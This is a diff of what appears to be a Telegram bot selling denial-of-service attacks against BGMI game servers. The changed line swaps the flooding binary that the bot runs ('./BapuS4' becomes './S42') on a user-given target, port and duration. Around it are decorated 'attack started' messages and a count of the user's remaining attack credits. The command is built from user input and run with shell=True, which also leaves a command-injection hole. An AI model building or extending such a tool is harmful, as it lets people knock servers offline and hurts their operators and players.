@@ -175,7 +175,7 @@ def handle_bgmi(message):
                     bot.send_message(user_id, f"𝆺𝅥⃝Oғͥғɪᴄͣɪͫ͢͢͢ᴀℓ —͟͞͞Ꮅ𝙧ɇ𝙢īū𝙢—͟͞͞\n🔗 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗶𝗻𝗴 𝗔𝘁𝘁𝗮𝗰𝗸 🔗\n\n▁ ▂ ▄ ▅ ▆ ▇ █\nA̶t̶t̶a̶c̶k̶ ̶B̶y̶ ̶:̶-̶ {username} \n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══")
                     
                     # Start the attack
-                    subprocess.run(f"./BapuS4 {target} {port} {duration} 1000", shell=True)
+                    subprocess.run(f"./S42 {target} {port} {duration} 1000", shell=True)
 
                     # Inform user that the attack started
                     bot.reply_to(message, f"𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙏𝙐𝙎 ✅ \n𝙔𝙊𝙐𝙍 𝘾𝙍𝙀𝘿𝙄𝙏𝙨 --> 5/{remaining_attacks - 1}\n\n═══𝘚❹ ➭ 𝖔𝖋𝖋𝖎𝖈𝖎𝖆𝖑═══")
